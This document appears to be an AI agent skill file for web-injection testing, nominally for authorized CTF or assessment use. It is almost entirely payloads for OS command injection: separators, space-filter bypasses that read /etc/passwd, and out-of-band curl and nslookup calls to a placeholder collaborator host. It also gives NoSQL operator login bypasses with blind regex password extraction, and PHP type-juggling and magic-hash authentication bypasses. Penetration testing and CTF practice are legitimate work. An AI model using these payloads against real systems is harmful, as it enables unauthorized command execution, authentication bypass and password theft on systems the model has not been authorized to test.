name: web-injection-advanced
description: Advanced injection techniques beyond classic SQLi — OS command injection, NoSQL operator injection (MongoDB/Redis), and PHP type-juggling/weak-comparison bypass. Each is a "logic flaw in how input reaches an interpreter", with the exact trigger + bypass + blind-detection path. Use when a target runs shell commands, a NoSQL/JSON query store, or loose PHP == comparisons.
---

# Advanced Web Injection (cmd / NoSQL / PHP type juggling)

Authorized CTF/assessment use. Three injection classes that get missed because testers only know SQLi. Each has a distinct trigger, a compact first-pass payload, and a blind-detection fallback.

## 1. OS Command Injection

**Trigger:** user input reaches a shell: `system()`, `exec()`, backticks, `os.popen`, converters (ImageMagick/ffmpeg), ping/dig wrappers, import pipelines.

**First-pass separators (context matters):**
```
generic        ;id    &&id    |id    ||id    &id
quoted arg     ";id;"  ';id;'
substitution   $(id)   `id`
newline        %0aid   %0d%0aid
```

**Space/filter bypass:**
```
cat$IFS/etc/passwd       (IFS as space)
{cat,/etc/passwd}        (brace expansion)
cat</etc/passwd          (redirect as input)
`id`  $(id)              (when ; and | are filtered)
```
**Blind / OOB detection** (when output is not reflected):
```
;sleep 5         → time-based (open vs closed)
;nslookup TOKEN.collab   → OOB DNS
;curl TOKEN.collab       → OOB HTTP
```

## 2. NoSQL injection (MongoDB / JSON query stores)

**Core idea:** not escaping a string — injecting query OPERATORS to change the query logic.

**Login bypass (JSON):**
```json
{"username": "admin", "password": {"$ne": "invalid"}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$regex": ".*"}}
```
**URL-encoded form (PHP array injection):**
```
username=admin&password[$ne]=invalid
username=admin&password[$gt]=
```
**Blind extraction** (MongoDB):
```
password[$regex]=^a     → true if password starts with 'a'
password[$regex]=^ab    → incrementally recover each char
```
**Operator cheat-sheet:** `$ne` (not equal), `$gt/$lt` (greater/less), `$regex` (pattern), `$where` (JS eval, RCE-adjacent), `$in`, `$exists`.

**Verify:** a `$ne`/`$regex` login returns a valid session (or a boolean response flips) → NoSQL injection confirmed → enumerate fields/flag.

## 3. PHP type juggling (weak `==` comparison)

**Trigger:** source uses `==` (not `===`) or `strcmp`/`in_array` loose checks for secrets, passwords, HMACs.

**First-pass payloads (auth/token shape):**
```
password[]=x        (array vs string → both NULL in old PHP)
password=
0
true
{"password":true}
admin%00           (null-byte truncation)
```

**Magic hash (md5/sha1 loose compare):**
```
md5('240610708') == md5('QNKCDZO')   → both start "0e" → both cast to 0 → equal
```
Any two values whose hash matches `0e[0-9]+` compare equal under `==`. Use `240610708` / `QNKCDZO` / `0e215962017` as the classic pairs.

**`strcmp` array bypass:** `strcmp($input, "secret")` with `input[]=x` → NULL → `NULL == 0` is true in old PHP.

**Verify:** the loose check passes with a wrong-but-coerced value → type juggling confirmed → you bypass auth/signature without the real secret.

## Cross-cutting
- **Identify the interpreter** (shell / JSON query store / PHP `==`) — the attack differs entirely per class.
- **Blind paths exist for all three** (timing, OOB, regex char-by-char) — don't declare "not vulnerable" just because output isn't reflected.
- Self-verify with a benign probe (`id`, `sleep`, `$ne`) before the real payload.
